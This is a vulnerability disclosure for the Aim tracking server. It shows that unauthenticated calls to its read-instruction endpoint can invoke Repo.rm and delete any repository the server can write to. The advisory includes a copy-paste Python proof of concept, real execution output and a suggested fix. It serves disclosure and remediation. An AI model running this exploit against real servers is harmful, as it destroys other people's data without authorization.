# Aim tracking server: unauthenticated remote `Repo.rm` deletes any server-writable repository, not just the mounted one

**Upstream issue:** https://github.com/aimhubio/aim/issues/3422

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04 against a real `aim server`; output below is from the actual run)

## Reproduction conditions

- aim 3.29.1 (pip), Python 3.11, Ubuntu 24.04
- A running `aim server --repo <path>` with default settings: binds `0.0.0.0:53800`, **no authentication**, CORS `*`
- Attacker needs only network access to port 53800 and `pip install aim requests` (the attack uses aim's own codecs — no custom wrapper)

## Description

The tracking server registers `Repo` as a remote resource type (`prepare_resource_registry` in `aim/ext/transport/server.py`), and `/tracking/{client_uri}/read-instruction/` dispatches any client-supplied `method_name` via `getattr(resource, method_name)()` with **no allowlist of callable methods** (`run_instruction` in `aim/ext/transport/tracking.py`; the only check, `_verify_resource_handler`, merely ties the handler to the same `client_uri`, which any unauthenticated caller obtains from its own `get-resource` call).

`Repo.rm(path)` (`aim/sdk/repo.py`) is reachable this way: it resolves the target directory from the **call argument** and runs `shutil.rmtree(path/.aim)` — not restricted to the repository mounted by the server.

## Impact

Anyone with network access to the tracking port can delete the Aim repository at any server-writable path — not just the mounted one — permanently destroying experiment data with two unauthenticated HTTP requests.

## PoC (copy-paste ready)

**Step 1 — victim starts a server on one repo (a second repo exists elsewhere, not served):**

```bash
mkdir -p /tmp/mount_repo /tmp/victim_repo
(cd /tmp/mount_repo  && aim init)
(cd /tmp/victim_repo && aim init)
aim server --repo /tmp/mount_repo        # binds 0.0.0.0:53800, no auth
```

**Step 2 — attacker (any host that can reach :53800) deletes the out-of-mount repo:**

```python
import base64, requests
from aim.ext.transport.message_utils import pack_args
from aim.storage.treeutils import encode_tree

BASE = "http://<server>:53800/tracking/poc-attacker"
h = requests.post(f"{BASE}/get-resource/",
                  json={"resource_handler": "", "resource_type": "Repo",
                        "args": base64.b64encode(b"").decode()}).json()["handler"]

args = pack_args(encode_tree(("/tmp/victim_repo",)))   # any server-writable path
requests.post(f"{BASE}/read-instruction/",
              json={"resource_handler": h, "method_name": "rm",
                    "args": base64.b64encode(args).decode()})
```

**Step 3 — verify:** `/tmp/victim_repo/.aim` is gone; `/tmp/mount_repo/.aim` untouched.

## Execution result (actual run: aim 3.29.1 / Python 3.11 / Ubuntu 24.04)

```
=== Step 1: prepare two repos — mount_repo (served) and victim_repo (NOT served) ===
mount_repo/.aim
victim_repo/.aim        (contents: VERSION locks meta progress run_metadata.sqlite)

=== Step 2: start aim server on the mount_repo (default 0.0.0.0:53800, no auth) ===
Running Aim Server on repo `/tmp/aim3422/mount_repo`
Server is mounted on aim://0.0.0.0:53800

=== Step 3: attacker — two unauthenticated HTTP requests via aim's own codecs ===
[evidence] before: victim/.aim=True mounted/.aim=True
[attacker] got Repo handler: 73a83ea7-999c-4fcc-8146-a84fb0aa43c4
[attacker] read-instruction rm -> HTTP 200
[RESULT] {"victim_dot_aim_before": true, "victim_dot_aim_after": false,
          "mounted_dot_aim_after": true, "verdict": "REPRODUCED"}

=== Step 4: filesystem evidence ===
victim_repo/.aim exists:  NO - deleted by attacker
mount_repo/.aim exists:   yes - intact
```

The out-of-mount `victim_repo/.aim` was removed by `shutil.rmtree` inside the server process, while the actually mounted repository stayed intact.

## Suggested fix

Restrict remote-instruction dispatch to an explicit allowlist of resource methods, and make path-taking methods (`rm`, `delete_run`, …) operate only within the mounted repository root.
